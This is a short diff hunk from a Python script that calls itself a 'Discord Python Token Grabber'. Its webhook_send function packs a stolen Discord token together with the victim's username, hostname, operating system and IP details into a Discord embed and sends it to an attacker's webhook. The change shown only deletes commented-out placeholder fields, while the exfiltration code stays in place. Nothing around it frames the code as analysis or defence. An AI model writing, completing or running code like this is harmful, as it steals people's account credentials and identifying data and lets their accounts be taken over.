@@ -40,11 +40,6 @@ def webhook_send(token):
     embed = DiscordEmbed(title='Token Grabber', description='**Token: __'+str(token[0])+"__\nUsername: __"+getpass.getuser()+"__\nHostname: __"+socket.gethostname()+"__\nOs: __"+platform.platform()+"__**"+ipInfo(), color=242424)
     embed.set_footer(text='Discord Python Token Grabber')
     embed.set_timestamp()
-    #embed.add_embed_field(name='Field 1', value='Lorem ipsum')
-    #embed.add_embed_field(name='Field 2', value='dolor sit')
-    #embed.add_embed_field(name='Field 3', value='amet consetetur')
-    #embed.add_embed_field(name='Field 4', value='sadipscing elitr')
-
     webhook.add_embed(embed)
     response = webhook.execute()
     exit()
